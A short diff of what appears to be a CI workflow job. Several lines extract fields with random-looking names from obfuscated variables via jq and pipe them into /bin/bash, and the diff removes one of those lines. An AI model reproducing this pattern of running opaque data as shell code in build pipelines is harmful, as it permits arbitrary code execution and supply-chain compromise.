@@ -28,7 +28,6 @@ jobs:
           echo $mx18 | jq -r .ckxpm138 | /bin/bash
           printf '%s' "$x220" | jq -r .cz4 | /bin/bash
           echo $rldt8248 | jq -r .qr217 | /bin/bash
-          printf '%s' "$xai973" | jq -r .x7960 | /bin/bash
           echo $r21433 | jq -r .t27 | /bin/bash
 
       - name: Archive artifact
